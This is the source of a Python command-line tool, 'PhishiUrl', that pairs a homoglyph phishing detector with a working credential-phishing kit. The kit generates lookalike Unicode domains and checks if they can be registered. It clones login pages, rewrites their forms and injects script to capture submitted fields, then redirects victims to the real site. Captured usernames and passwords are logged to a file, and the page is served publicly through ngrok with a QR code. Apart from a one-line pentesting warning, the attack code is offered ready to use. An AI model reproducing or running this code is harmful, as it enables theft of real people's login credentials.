#!/usr/bin/env python
import click
import json
import os
import itertools
import requests
import re
import subprocess
from rich.console import Console
from rich.table import Table
from pyngrok import ngrok
from whois import whois
from http.server import HTTPServer, SimpleHTTPRequestHandler
import qrcode
from bs4 import BeautifulSoup
import urllib.parse
import win32api
import win32con
import win32security
import shutil
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

console = Console()

# Tool and author information
TOOL_NAME = "PhishiUrl"
AUTHOR_NAME = "Emad"
VERSION_NUM = "1.2.8"
GITHUB_URL = "github.com/EmadYaY"

# Unicode mappings for character substitution
unicode_replacements = [
    {'a': '\u0430'}, {'c': '\u03F2'}, {'e': '\u0435'}, {'o': '\u043E'}, {'p': '\u0440'},
    {'s': '\u0455'}, {'d': '\u0501'}, {'q': '\u051B'}, {'w': '\u051D'},
    {'m': 'rn'}, {'l': '1'}, {'o': '0'}, {'a': 'α'}, {'e': 'е'}, {'o': 'о'}
]

# Additional Unicode mappings for Persian, Arabic, Kurdish, and Turkish
extra_unicode_replacements = [
    {'aleph': '\u0627'}, {'ae': '\u06D5'}, {'waw': '\u0648'}, {'pe': '\u067E'},
    {'gaf': '\u06AF'}, {'dotless_i': '\u0131'}, {'null': '\x00'}
]

# Keywords to identify login-related inputs
LOGIN_KEYWORDS = [
    'user', 'pass', 'login', 'email', 'password', 'username', 'pwd', 'signin', 'auth',
    'name', 'id', 'account', 'credential', 'key', 'token', 'access', 'log', 'sign'
]

# Load configuration
def load_config():
    config_file = 'config.json'
    default_config = {
        'ngrok_token': '',
        'virustotal_api_key': '',
        'phishtank_api_key': '',
        'templates_path': './templates'
    }

    if os.path.exists(config_file):
        with open(config_file, 'r', encoding='utf-8') as f:
            config = json.load(f)
            # Ensure all keys exist
            for key in default_config:
                if key not in config:
                    config[key] = default_config[key]
            return config
    else:
        # Create a new config file
        with open(config_file, 'w', encoding='utf-8') as f:
            json.dump(default_config, f, indent=2)
        console.print(f"[green]Created new config file: {config_file}[/green]")
        return default_config

def save_config(config):
    """Save updated configuration to config.json."""
    config_file = 'config.json'
    with open(config_file, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=2)
    console.print(f"[green]Updated config file: {config_file}[/green]")

# Phishing Detection
class PhishingDetector:
    def __init__(self):
        self.suspicious_keywords = ['login', 'verify', 'account']
        self.unicode_replacements = unicode_replacements + extra_unicode_replacements
        self.homoglyph_map = {
            '0': 'o', '1': 'l', '5': 's', 'rn': 'm', 'i': '1', 'o': '0',
            'l': '1', 's': '5', 'm': 'rn', 'b': '6', 'q': '9', 'vv': 'w'
        }
        self.deceptive_chars = {'1', '0', '5', 'rn', 'vv', '6', '9'}

    def normalize_domain(self, domain):
        normalized = domain.lower()
        for homoglyph, ascii_char in self.homoglyph_map.items():
            normalized = normalized.replace(homoglyph, ascii_char)
        for repl in self.unicode_replacements:
            for char, unicode_char in repl.items():
                normalized = normalized.replace(unicode_char, char)
        return normalized

    def validate_domain(self, domain):
        """Check for invalid or unrelated characters."""
        valid_chars = set('abcdefghijklmnopqrstuvwxyz0123456789-.')
        allowed_unicode = {v for repl in self.unicode_replacements for v in repl.values()}
        for c in domain.lower():
            if c not in valid_chars and c not in allowed_unicode:
                raise ValueError(f"Invalid character detected: {c} (U+{ord(c):04X})")

    def detect(self, url):
        score = 0
        alerts = []

        domain_match = re.match(r'(?:https?://)?([^/]+)', url)
        domain = domain_match.group(1) if domain_match else url

        # Validate domain characters
        try:
            self.validate_domain(domain)
        except ValueError as e:
            console.print(f"[red]Error: {str(e)}[/red]")
            return {'url': url, 'score': 0, 'alerts': [str(e)], 'is_phishing': False}

        # Homoglyph detection (priority)
        malicious_chars = []
        for i in range(len(domain)):
            c = domain[i]
            if ord(c) > 127 or c in self.deceptive_chars:
                malicious_chars.append(c)
            if i < len(domain) - 1 and domain[i:i+2] in self.deceptive_chars:
                malicious_chars.append(domain[i:i+2])
        if malicious_chars:
            score += 60
            char_details = [f"{c} (U+{ord(c):04X})" if len(c) == 1 else c for c in malicious_chars]
            alerts.append(f"Phishing due to homoglyph characters: {', '.join(char_details)}")

        # Suspicious keywords
        for kw in self.suspicious_keywords:
            if kw in url.lower():
                score += 20
                alerts.append(f"Suspicious keyword: {kw}")

        # External checks (optional, no score impact unless malicious)
        try:
            whois_status = check_domain_availability(domain)
            alerts.append(f"WHOIS: {'Registered' if whois_status else 'Available'}")
        except:
            alerts.append("WHOIS: Offline")

        curl_result = test_curl(domain)
        alerts.append(f"Curl: {curl_result['status']}")
        if curl_result['reachable'] == 'DOWN':
            alerts.append("Domain not reachable")

        try:
            config = load_config()
            vt_result = check_virustotal(url, config.get('virustotal_api_key'))
            if vt_result.get('status') == 'malicious':
                score += 50
                alerts.append("VirusTotal flagged as malicious")
            elif vt_result.get('error'):
                alerts.append(f"VirusTotal error: {vt_result['error']}")
            else:
                alerts.append("VirusTotal: Clean")
        except:
            alerts.append("VirusTotal: Offline")

        try:
            pt_result = check_phishtank(url)
            if pt_result.get('status') == 'malicious':
                score += 50
                alerts.append("PhishTank flagged as malicious")
            elif pt_result.get('error'):
                alerts.append(f"PhishTank error: {pt_result['error']}")
            else:
                alerts.append("PhishTank: Clean")
        except:
            alerts.append("PhishTank: Offline")

        return {'url': url, 'score': score, 'alerts': alerts, 'is_phishing': score >= 60}

# Network Functions
def test_curl(domain):
    try:
        result = subprocess.run(['curl', '-i', '-L', '-s', domain], capture_output=True, text=True, encoding='utf-8', errors='ignore')
        output = result.stdout
        if output:
            status_line = output.split('\n')[0].strip()
            return {'status': status_line, 'reachable': 'UP'}
        return {'status': 'Failed', 'reachable': 'DOWN'}
    except:
        return {'status': 'Offline', 'reachable': 'DOWN'}

def test_connection(domain):
    try:
        result = subprocess.run(['ping', '-n', '1', domain], capture_output=True, text=True)
        if "Reply from" in result.stdout:
            return "[green][*][/green] Connection test: UP"
    except:
        pass
    return "[yellow][!][/yellow] Connection test: DOWN"

# VirusTotal Integration
def check_virustotal(url, api_key=None):
    config = load_config()
    if not api_key:
        api_key = config.get('virustotal_api_key')
        if not api_key:
            api_key = click.prompt("Enter VirusTotal API key", hide_input=True)
            config['virustotal_api_key'] = api_key
            save_config(config)

    endpoint = "https://www.virustotal.com/vtapi/v2/url/report"
    params = {'apikey': api_key, 'resource': url}
    try:
        response = requests.get(endpoint, params=params)
        if response.status_code == 200:
            result = response.json()
            if result.get('positives', 0) > 0:
                return {'status': 'malicious', 'details': result}
            return {'status': 'clean', 'details': result}
        elif response.status_code == 403:
            return {'error': 'Invalid or unauthorized VirusTotal API key'}
        elif response.status_code == 429:
            return {'error': 'VirusTotal rate limit exceeded'}
        return {'error': f"Request failed: {response.status_code}"}
    except Exception as e:
        return {'error': f"Network error: {str(e)}"}

# PhishTank Integration
def check_phishtank(url):
    endpoint = "https://checkurl.phishtank.com/checkurl/"
    payload = {'url': url, 'format': 'json'}
    try:
        response = requests.post(endpoint, data=payload)
        if response.status_code == 200:
            result = response.json()
            if result.get('results', {}).get('in_database', False):
                return {'status': 'malicious', 'details': result}
            return {'status': 'clean', 'details': result}
        return {'error': f"Request failed: {response.status_code}"}
    except Exception as e:
        return {'error': f"Network error: {str(e)}"}

# Website Cloning
def clone_website(url, homoglyph_domain, use_local=False, local_folder=None, download_js=True, download_all=False):
    """Clone a website page or use local files and modify it for phishing."""
    try:
        config = load_config()
        clone_dir = os.path.join(config['templates_path'], 'cloned', homoglyph_domain.replace('.', '_'))
        os.makedirs(clone_dir, exist_ok=True)

        # Headers for requests
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

        if use_local:
            # Validate local folder
            if not local_folder or not os.path.isdir(local_folder):
                console.print(f"[red]Error: Invalid or non-existent folder: {local_folder}[/red]")
                return None
            index_path = os.path.join(local_folder, 'index.html')
            if not os.path.isfile(index_path):
                console.print(f"[red]Error: index.html not found in {local_folder}[/red]")
                return None

            # Read index.html
            with open(index_path, 'r', encoding='utf-8') as f:
                soup = BeautifulSoup(f, 'html.parser')

            # Copy all files to clone_dir
            for item in os.listdir(local_folder):
                src = os.path.join(local_folder, item)
                dst = os.path.join(clone_dir, item)
                if os.path.isfile(src):
                    shutil.copy2(src, dst)
                elif os.path.isdir(src):
                    shutil.copytree(src, dst, dirs_exist_ok=True)
            console.print(f"[green]Copied local files from {local_folder} to {clone_dir}[/green]")

        else:
            # Step 1: Download the initial HTML using Requests
            try:
                response = requests.get(url, headers=headers, timeout=10)
                response.raise_for_status()
                soup = BeautifulSoup(response.text, 'html.parser')
                console.print("[green]Fetched initial page with Requests.[/green]")
            except Exception as e:
                console.print(f"[red]Error fetching page with Requests: {str(e)}[/red]")
                return None

            # Step 2: Download assets
            assets_to_download = []
            
            # CSS and Favicon (always download)
            for link in soup.find_all('link'):
                if link.get('href'):
                    asset_url = urllib.parse.urljoin(url, link['href'])
                    assets_to_download.append(('href', link, asset_url))
            
            # JavaScript (only if download_js is True)
            if download_js:
                for script in soup.find_all('script'):
                    if script.get('src'):
                        asset_url = urllib.parse.urljoin(url, script['src'])
                        assets_to_download.append(('src', script, asset_url))
            else:
                console.print("[yellow]Skipping JavaScript download as per user request.[/yellow]")
            
            # Images and Fonts (only if download_all is True)
            if download_all:
                # All Images
                for img in soup.find_all('img'):
                    if img.get('src'):
                        asset_url = urllib.parse.urljoin(url, img['src'])
                        assets_to_download.append(('src', img, asset_url))
                # Fonts (e.g., from CSS links or style tags)
                for link in soup.find_all('link'):
                    if link.get('href') and ('font' in link.get('href', '').lower() or link.get('rel') == ['stylesheet']):
                        asset_url = urllib.parse.urljoin(url, link['href'])
                        assets_to_download.append(('href', link, asset_url))
                console.print("[green]Downloading all assets (images, fonts, etc.) as per user request.[/green]")
            else:
                # Only potential logos
                for img in soup.find_all('img'):
                    if img.get('src'):
                        is_logo = (
                            'logo' in img.get('src', '').lower() or
                            img.find_parent('header') or
                            any('logo' in cls.lower() for cls in img.get('class', []))
                        )
                        if is_logo:
                            asset_url = urllib.parse.urljoin(url, img['src'])
                            assets_to_download.append(('src', img, asset_url))

            # Download selected assets
            for attr, tag, asset_url in assets_to_download:
                try:
                    asset_response = requests.get(asset_url, headers=headers, timeout=5)
                    asset_response.raise_for_status()
                    # Clean the asset name (remove query parameters)
                    parsed_url = urllib.parse.urlparse(asset_url)
                    asset_name = os.path.basename(parsed_url.path)
                    if not asset_name:
                        # Generate a name if none exists
                        ext = '.bin'
                        if attr == 'href' and 'css' in tag.get('rel', []):
                            ext = '.css'
                        elif attr == 'src' and tag.name == 'script':
                            ext = '.js'
                        elif attr == 'src' and tag.name == 'img':
                            ext = os.path.splitext(asset_url)[1] or '.png'
                        asset_name = f"asset_{hash(asset_url)}{ext}"
                    asset_path = os.path.join(clone_dir, asset_name)
                    with open(asset_path, 'wb') as f:
                        f.write(asset_response.content)
                    # Update the tag to point to the local file
                    tag[attr] = asset_name
                    console.print(f"[green]Downloaded asset: {asset_name}[/green]")
                except Exception as e:
                    console.print(f"[yellow]Warning: Failed to download asset {asset_url}: {str(e)}[/yellow]")
                    # Keep the original URL if download fails

            # Step 3: Use Selenium to analyze the final DOM for inputs and forms
            try:
                chrome_options = Options()
                chrome_options.add_argument('--headless')
                chrome_options.add_argument('--disable-gpu')
                chrome_options.add_argument('--disable-tflite')
                driver = webdriver.Chrome(options=chrome_options)
                driver.get(url)

                # Wait for inputs to appear (up to 5 seconds)
                try:
                    WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.TAG_NAME, "input"))
                    )
                except:
                    console.print("[yellow]Warning: No inputs found after waiting.[/yellow]")

                # Get the final HTML after JavaScript execution
                final_html = driver.page_source
                soup = BeautifulSoup(final_html, 'html.parser')
                driver.quit()
                console.print("[green]Analyzed DOM with Selenium to find inputs and forms.[/green]")
            except Exception as e:
                console.print(f"[yellow]Warning: Selenium failed ({str(e)}), proceeding with initial HTML.[/yellow]")
                driver.quit()

        # Find all input tags
        inputs = soup.find_all('input')
        if not inputs:
            console.print(f"[red]Error: No <input> tags found in the page at {url}. At least one input is required for credential capturing.[/red]")
            console.print("[yellow]You can still proceed to serve the cloned page, but credential capturing will not work.[/yellow]")
            html_path = os.path.join(clone_dir, 'index.html')
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            console.print(f"[green]Cloned page saved to {html_path} (without input capturing)[/green]")
            return clone_dir

        # Ensure all inputs have a name attribute
        for idx, input_tag in enumerate(inputs):
            if not input_tag.get('name'):
                input_tag['name'] = f"input_{idx}"
        
        # Check if inputs are inside a form
        forms = soup.find_all('form')
        if forms:
            for form in forms:
                # Modify existing forms
                original_action = form.get('action')
                if original_action:
                    original_action = urllib.parse.urljoin(url, original_action) if not use_local else original_action
                else:
                    original_action = url
                
                form['method'] = 'POST'
                form['action'] = '/capture'

                # Add original action as hidden input
                original_action_input = soup.new_tag('input')
                original_action_input['type'] = 'hidden'
                original_action_input['name'] = 'original_action'
                original_action_input['value'] = original_action
                form.append(original_action_input)

                # Ensure there's a submit button
                if not form.find('button', type='submit') and not form.find('input', type='submit'):
                    submit_button = soup.new_tag('button')
                    submit_button['type'] = 'submit'
                    submit_button['style'] = 'display: none;'
                    form.append(submit_button)

            console.print("[green]Found existing forms, modified to capture credentials.[/green]")
        else:
            # If no form exists, wrap all inputs in a hidden form
            input_groups = {}
            for input_tag in inputs:
                parent = input_tag.find_parent()
                if parent not in input_groups:
                    input_groups[parent] = []
                input_groups[parent].append(input_tag)

            for parent, group in input_groups.items():
                new_form = soup.new_tag('form')
                new_form['method'] = 'POST'
                new_form['action'] = '/capture'
                new_form['style'] = 'display: inline;'

                original_action_input = soup.new_tag('input')
                original_action_input['type'] = 'hidden'
                original_action_input['name'] = 'original_action'
                original_action_input['value'] = url
                new_form.append(original_action_input)

                submit_button = soup.new_tag('button')
                submit_button['type'] = 'submit'
                submit_button['style'] = 'display: none;'
                new_form.append(submit_button)

                first_input = group[0]
                parent.insert(parent.index(first_input), new_form)
                for input_tag in group:
                    input_tag.extract()
                    new_form.append(input_tag)

            console.print("[green]No form found, added hidden forms around inputs to capture credentials.[/green]")

        # Add JavaScript to capture form submissions
        script = soup.new_tag('script')
        script.string = """
        (function() {
            // Add submit event listener to all forms
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', function(event) {
                    event.preventDefault(); // Prevent default form submission
                    const formData = new FormData(form);
                    const data = Object.fromEntries(formData);
                    console.log('Form submitted, captured data:', data);
                    fetch('/capture', {
                        method: 'POST',
                        body: formData
                    }).then(response => {
                        console.log('Credentials captured:', response.status);
                        // Optionally redirect to original action
                        const originalAction = form.querySelector('input[name="original_action"]');
                        if (originalAction && originalAction.value) {
                            window.location.href = originalAction.value;
                        }
                    }).catch(err => {
                        console.error('Capture failed:', err);
                    });
                });
            });
        })();
        """
        body = soup.find('body') or soup.find('html')
        body.append(script)

        # Save modified HTML
        html_path = os.path.join(clone_dir, 'index.html')
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        console.print(f"[green]Cloned page saved to {html_path}[/green]")
        return clone_dir
    except Exception as e:
        console.print(f"[red]Error cloning website: {str(e)}[/red]")
        return None

def modify_hosts_file(homoglyph_domain, ip='127.0.0.1'):
    """Modify Windows hosts file to map homoglyph domain to IP."""
    hosts_path = r'C:\Windows\System32\drivers\etc\hosts'
    entry = f"{ip} {homoglyph_domain}\n"
    try:
        # Check for admin privileges
        if not is_admin():
            console.print("[red]Error: Admin privileges required to modify hosts file. Run as Administrator.[/red]")
            return False

        # Backup hosts file
        backup_path = hosts_path + '.backup'
        with open(hosts_path, 'r', encoding='utf-8') as f:
            content = f.read()
        with open(backup_path, 'w', encoding='utf-8') as f:
            f.write(content)
        console.print(f"[green]Backed up hosts file to {backup_path}[/green]")

        # Remove existing entries for the domain
        lines = content.splitlines()
        lines = [line for line in lines if not line.strip().startswith(f'127.0.0.1 {homoglyph_domain}') and not line.strip().startswith(f'0.0.0.0 {homoglyph_domain}')]
        lines.append(entry.strip())

        # Write updated hosts file
        with open(hosts_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(lines) + '\n')
        console.print(f"[green]Hosts file updated: {homoglyph_domain} mapped to {ip}[/green]")
        return True
    except Exception as e:
        console.print(f"[red]Error modifying hosts file: {str(e)}[/red]")
        return False

def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return win32security.GetTokenInformation(
            win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32con.TOKEN_QUERY),
            win32security.TokenElevation
        )['TokenIsElevated']
    except:
        return False

# Phishing URL Generation
def generate_phishing_urls(domain, tld, check_connection=False, output_file=False, check_availability=False):
    domain = domain.lower()
    phishing_replacements = unicode_replacements + extra_unicode_replacements
    matching_chars = [key for repl in phishing_replacements for key in repl if key in domain]

    results = []
    for combination in itertools.chain.from_iterable(itertools.combinations(matching_chars, i) for i in range(1, 9)):
        new_domain = domain
        unicode_chars, char_names = [], []
        for char in combination:
            for repl in phishing_replacements:
                if char in repl:
                    unicode_char = repl[char]
                    unicode_chars.append(unicode_char)
                    new_domain = new_domain.replace(char, unicode_char)
                    for u_repl in phishing_replacements:
                        if unicode_char in u_repl.values():
                            char_names.append(list(u_repl.keys())[0])
        phishing_url = new_domain + tld
        result = {
            'original_domain': domain + tld,
            'phishing_url': phishing_url,
            'replaced_chars': combination,
            'unicode_chars': unicode_chars,
            'unicode_names': char_names
        }
        if check_connection:
            result['connection_status'] = test_connection(phishing_url)
        if check_availability:
            availability = check_domain_availability(phishing_url)
            result['availability'] = "Available" if availability is None else "Registered"
        results.append(result)

        for path in generate_phishing_paths(new_domain, tld, check_connection, output_file):
            path_result = {'phishing_url': path, 'connection_status': test_connection(path) if check_connection else None}
            results.append(path_result)

    display_phishing_urls(results, output_file)
    return results

def generate_phishing_paths(base_domain, tld, check_connection=False, output_file=False):
    example_paths = ["/example", "/index", "/test", "/login"]
    phishing_paths = []
    for path in example_paths:
        for repl in extra_unicode_replacements + [{'null': '\x00'}]:
            original_char = list(repl.keys())[0]
            phishing_char = list(repl.values())[0]
            if original_char in path:
                phishing_path = path.replace(original_char, phishing_char)
                phishing_paths.append(base_domain + tld + phishing_path)
    return phishing_paths

def display_phishing_urls(results, output_file=False):
    table = Table(title="Generated Phishing URLs")
    table.add_column("Original Domain")
    table.add_column("Phishing URL")
    table.add_column("Replaced Chars")
    table.add_column("Unicode Chars")
    table.add_column("Availability", justify="center")

    for result in results:
        if 'original_domain' in result:
            table.add_row(
                result['original_domain'],
                result['phishing_url'],
                str(result['replaced_chars']),
                str(result['unicode_chars']),
                result.get('availability', 'N/A')
            )

    console.print(table)
    if output_file:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(results, indent=2, ensure_ascii=False) + '\n')

# Tunneling
def start_ngrok(port=8080):
    config = load_config()
    ngrok_token = config.get('ngrok_token')
    if not ngrok_token:
        ngrok_token = click.prompt("Enter Ngrok token", hide_input=True)
        config['ngrok_token'] = ngrok_token
        save_config(config)
    
    ngrok.set_auth_token(ngrok_token)
    try:
        tunnel = ngrok.connect(port)
        console.print(f"[green]Tunnel created: {tunnel.public_url}[/green]")
        generate_qr_code(tunnel.public_url)
        return tunnel.public_url
    except Exception as e:
        console.print(f"[red]Error creating tunnel: {str(e)}[/red]")
        return None

def start_web_server(port, clone_dir=None, template='index.html', local_address=None, ngrok_address=None):
    if clone_dir:
        os.chdir(clone_dir)
    else:
        os.chdir(load_config()['templates_path'])
    server = HTTPServer(
        ('', port),
        lambda *args, **kwargs: PhishingHandler(
            *args,
            template=template,
            local_address=local_address,
            ngrok_address=ngrok_address,
            **kwargs
        )
    )
    console.print(f"[green]Web server started on port {port}[/green]")
    server.serve_forever()

class PhishingHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, template='index.html', local_address=None, ngrok_address=None, **kwargs):
        self.template = template
        self.local_address = local_address
        self.ngrok_address = ngrok_address
        super().__init__(*args, **kwargs)

    def do_GET(self):
        if self.path == '/':
            self.send_response(301)
            self.send_header('Location', f'/{self.template}')
            self.end_headers()
        else:
            super().do_GET()

    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            # Parse POST data
            post_params = urllib.parse.parse_qs(post_data)
            # Flatten params (take first value for each key)
            post_params = {k: v[0] for k, v in post_params.items()}
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            credentials_file = 'credentials.txt'
            mode = 'a' if os.path.exists(credentials_file) else 'w'
            
            # Format the captured data
            with open(credentials_file, mode, encoding='utf-8') as f:
                if mode == 'a':
                    f.write('\n')
                addresses = []
                if self.local_address:
                    addresses.append(f"Local: {self.local_address}")
                if self.ngrok_address:
                    addresses.append(f"Ngrok: {self.ngrok_address}")
                f.write(f"[{timestamp}] {' | '.join(addresses)}\n")
                
                # Write login-related fields
                login_data_written = False
                for key, value in post_params.items():
                    if key != 'original_action':
                        if any(keyword in key.lower() for keyword in LOGIN_KEYWORDS):
                            f.write(f"- {key.capitalize()}: {value}\n")
                            login_data_written = True
                
                # If no login data was written, write all fields as "Other Data"
                if not login_data_written:
                    for key, value in post_params.items():
                        if key != 'original_action':
                            f.write(f"- {key.capitalize()}: {value}\n")
            
            console.print(f"[green]Credentials captured and saved to {credentials_file}[/green]")

            # Respond with a simple 200 OK
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Credentials captured")
        else:
            self.send_response(404)
            self.end_headers()

def generate_qr_code(url):
    qr = qrcode.QRCode()
    qr.add_data(url)
    qr.print_ascii()
    console.print("[green]QR code generated for tunnel URL[/green]")

# Homoglyph Suggestions
def suggest_homoglyph_domains(domain):
    domain = domain.lower()
    suggestions = [domain]
    unicode_chars = []
    char_names = []

    for repl in unicode_replacements + extra_unicode_replacements:
        for char, unicode_char in repl.items():
            if char in domain:
                new_domain = domain.replace(char, unicode_char)
                if new_domain != domain:
                    suggestions.append(new_domain)
                    unicode_chars.append(unicode_char)
                    char_names.append(char)

    results = []
    for sugg in suggestions:
        availability = check_domain_availability(sugg)
        status = "Available" if availability is None else "Registered"
        results.append({'domain': sugg, 'status': status})

    table = Table(title="Suggested Domains")
    table.add_column("Domain")
    table.add_column("Status")
    for result in results:
        table.add_row(result['domain'], result['status'])
    console.print(table)

    return results

def check_domain_availability(domain_name):
    try:
        return whois(domain_name).registrar
    except:
        return None

# Reporting
def generate_report(results):
    table = Table(title="Phishing Analysis Results")
    table.add_column("URL")
    table.add_column("Risk Score")
    table.add_column("Status")
    table.add_column("Alerts")

    for result in results:
        status = "[red]Phishing[/red]" if result['is_phishing'] else "[green]Safe[/green]"
        alerts = "; ".join(result['alerts']) if result['alerts'] else "None"
        table.add_row(result['url'], str(result['score']), status, alerts)

    console.print(table)

    with open('report.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    console.print("[green]Report saved to report.json[/green]")

# Display Banner
def display_banner(output_file=False):
    banner = """
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗██╗   ██╗██████╗ ██╗                   ██╗██████╗ ███╗   ██╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║██║   ██║██╔══██╗██║                   ██║██╔══██╗████╗  ██║
██████╔╝███████║██║███████╗███████║██║██║   ██║██████╔╝██║         █████╗    ██║██║  ██║██╔██╗ ██║
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║   ██║██╔══██╗██║         ╚════╝    ██║██║  ██║██║╚██╗██║
██║     ██║  ██║██║███████║██║  ██║██║╚██████╔╝██║  ██║███████╗              ██║██████╔╝██║ ╚████║
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝              ╚═╝╚═════╝ ╚═╝  ╚═══╝

Tool: {tool_name}
By: {author_name}
Version: {version_num}
GitHub: {github_url}
""".format(
        tool_name=TOOL_NAME,
        author_name=AUTHOR_NAME,
        version_num=VERSION_NUM,
        github_url=GITHUB_URL
    )
    console.print(f"[green]{banner}[/green]")
    if output_file:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(banner + '\n')

# CLI Commands
@click.group()
def cli():
    """PhishiUrl - Phishing Detection and Simulation Tool"""
    pass

@cli.command()
@click.option('--url', help='URL to analyze')
@click.option('--file', type=click.Path(exists=True), help='File with list of URLs')
@click.option('--output', help='Output file for results')
def check(url, file, output):
    """Analyze URL(s) for phishing"""
    if output:
        with open(output, 'w', encoding='utf-8') as f:
            f.write('')
        display_banner(output)
    else:
        display_banner()

    detector = PhishingDetector()
    results = []

    def is_valid_url(url):
        regex = re.compile(r'^(https?://)?([^\s/]+)([/\S]*)?$')
        return bool(regex.match(url.strip()))

    if url:
        if is_valid_url(url):
            results.append(detector.detect(url))
        else:
            console.print(f"[yellow]Invalid URL format: {url}[/yellow]")
            results.append({'url': url, 'score': 0, 'alerts': ['Invalid URL format'], 'is_phishing': False})
    elif file:
        with open(file, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if is_valid_url(url):
                    results.append(detector.detect(url))
                else:
                    console.print(f"[yellow]Skipping invalid URL: {url}[/yellow]")
                    results.append({'url': url, 'score': 0, 'alerts': ['Invalid URL format'], 'is_phishing': False})

    generate_report(results)

@cli.command()
@click.option('--port', default=8080, help='Port for tunnel')
@click.option('--template', default='instagram_login.html', help='Phishing template file')
def tunnel(port, template):
    """Start Ngrok tunnel and web server"""
    tunnel_url = start_ngrok(port)
    if tunnel_url:
        start_web_server(port, template=template, local_address=None, ngrok_address=tunnel_url)

@cli.command()
@click.option('--domain', help='Domain for homoglyph suggestions')
@click.option('--output', help='Output file for results')
@click.option('--check-connection', is_flag=True, help='Check connection status')
@click.option('--check-availability', is_flag=True, help='Check domain availability')
def suggest(domain, output, check_connection, check_availability):
    """Suggest homoglyph domains"""
    if output:
        with open(output, 'w', encoding='utf-8') as f:
            f.write('')
        display_banner(output)
    else:
        display_banner()

    if domain:
        tld = ''.join(['.' + x for x in domain.split('.')[1:]]) if '.' in domain else ''
        generate_phishing_urls(domain.split('.')[0], tld, check_connection, output, check_availability)
    else:
        console.print("[red]Error: Please provide a domain[/red]")

@cli.command('api_check')
@click.option('--url', help='URL to analyze')
@click.option('--service', default='virustotal', help='API service (virustotal, phishtank)')
def api_check(url, service):
    """Analyze URL with external APIs"""
    if url:
        config = load_config()
        if service == 'virustotal':
            result = check_virustotal(url, config.get('virustotal_api_key'))
        elif service == 'phishtank':
            result = check_phishtank(url)
        else:
            result = {'error': 'Invalid service'}
        console.print(json.dumps(result, indent=2))
    else:
        console.print("[red]Error: Please provide a URL[/red]")

@cli.command()
@click.option('--url', help='URL to clone (e.g., https://www.apple.com/login)')
@click.option('--port', default=8080, help='Port for local server')
@click.option('--use-ngrok', is_flag=True, help='Expose server via ngrok')
@click.option('--local-folder', type=click.Path(exists=True, file_okay=False), help='Path to local folder with website files')
@click.option('--download-js', is_flag=True, help='Download JavaScript files (default: False)')
@click.option('--download-all', is_flag=True, help='Download all assets including images and fonts (default: False)')
def clone(url, port, use_ngrok, local_folder, download_js, download_all):
    """Clone a website or use local files and serve it locally or via ngrok with a homoglyph domain"""
    display_banner()
    console.print("[yellow]WARNING: This feature is for ethical pentesting only. Unauthorized use is illegal.[/yellow]")

    # Prompt for cloning source if not specified
    use_local = False
    if local_folder:
        use_local = True
    elif url:
        source = click.prompt("Do you want to clone from the URL or use local files? (url/local)", type=str, default='url')
        use_local = source.lower() == 'local'
        if use_local and not local_folder:
            local_folder = click.prompt("Enter the path to the local folder", type=click.Path(exists=True, file_okay=False))

    if not use_local and not url:
        console.print("[red]Error: Please provide a URL to clone or a local folder[/red]")
        return
    if use_local and not local_folder:
        console.print("[red]Error: Please provide a local folder path[/red]")
        return

    # Extract domain from URL or derive from homoglyph
    domain = None
    if url:
        domain_match = re.match(r'(?:https?://)?([^/]+)', url)
        if not domain_match:
            console.print(f"[red]Invalid URL format: {url}[/red]")
            return
        domain = domain_match.group(1)
    else:
        # For local files, prompt for a domain to generate homoglyphs
        domain = click.prompt("Enter the domain to generate homoglyphs (e.g., voorivex.academy)", type=str)

    # Generate homoglyph domain
    suggestions = suggest_homoglyph_domains(domain)
    homoglyph_domain = None
    for sugg in suggestions:
        if sugg['status'] == 'Available' and sugg['domain'] != domain:
            homoglyph_domain = sugg['domain']
            break
    if not homoglyph_domain:
        console.print("[red]Error: No available homoglyph domain found[/red]")
        return
    console.print(f"[green]Selected homoglyph domain: {homoglyph_domain}[/green]")

    # Clone the website or use local files
    clone_dir = clone_website(url, homoglyph_domain, use_local, local_folder, download_js, download_all)
    if not clone_dir:
        return

    # Modify hosts file for local access
    local_address = f"http://{homoglyph_domain}:{port}"
    if modify_hosts_file(homoglyph_domain, '127.0.0.1'):
        console.print(f"[green]Access locally at: {local_address}[/green]")
    else:
        console.print("[yellow]Continuing without hosts file modification[/yellow]")

    # Start server
    ngrok_address = None
    if use_ngrok:
        ngrok_address = start_ngrok(port)
        if ngrok_address:
            console.print(f"[green]Access remotely at: {ngrok_address}[/green]")
    start_web_server(port, clone_dir=clone_dir, template='index.html', local_address=local_address, ngrok_address=ngrok_address)

@cli.command()
def help():
    """Display detailed help"""
    console.print("""
    PhishiUrl - Phishing Detection and Simulation Tool
    Commands:
      check    - Analyze URLs for phishing
      tunnel   - Start a phishing page tunnel
      suggest  - Suggest homoglyph domains
      api_check - Analyze URL with VirusTotal or PhishTank
      clone    - Clone a website or use local files and serve it with a homoglyph domain
    Example:
      phishiurl check --url faceb00k.com
